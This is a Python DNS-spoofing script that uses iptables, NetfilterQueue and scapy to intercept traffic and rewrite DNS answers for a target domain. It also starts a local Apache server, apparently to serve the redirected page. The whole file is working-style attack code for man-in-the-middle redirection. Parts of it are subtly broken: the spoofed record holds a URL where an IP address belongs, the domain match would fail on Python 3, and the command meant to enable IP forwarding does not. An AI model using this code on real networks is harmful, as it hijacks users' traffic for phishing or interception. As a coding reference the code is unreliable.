#!/usr/bin/env python
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import subprocess


def remote_forward_traffic():
    subprocess.call(["iptables","--flush"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

# on same device for testing
def redirect_packet_to_this_script():
    # Redirect packets to the netfilterqueue
    subprocess.call(["iptables","--flush"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])


# Function to delete IP and UDP fields
def del_fields(packet):
    # Remove IP fields
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum

    # Remove UDP fields
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet

# Function to process packets and perform DNS spoofing
def process_packet(packet):
    # Convert packet to a Scapy packet
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        # Check if the DNS request is for the target domain
        if "badssl.com" in qname:
            # Create a DNS response with the desired spoofed IP
            dns_response = scapy.DNSRR(rrname=qname, rdata="http://www.speedbit.com")

            # Modify the DNS response fields
            scapy_packet[scapy.DNS].an = dns_response
            scapy_packet[scapy.DNS].ancount = 1

            # Delete IP and UDP fields
            modified_packet = del_fields(scapy_packet)

            # Set the modified packet as the new payload
            packet.set_payload(bytes(modified_packet))

    # Accept and forward the modified packet
    packet.accept()

try:
    # Create a netfilter queue object and bind it to queue number 0
    queue = NetfilterQueue()
    queue.bind(0, process_packet)

    # Add iptables rules
    redirect_packet_to_this_script()

    # Start Apache 2
    subprocess.call(["service", "apache2", "start"])

    # Run the queue
    queue.run()
except KeyboardInterrupt:
    # Flush the iptables rules and stop Apache 2
    subprocess.call(["iptables","--flush"])
    subprocess.call(["service", "apache2", "stop"])

    # Exit the script
    queue.unbind()
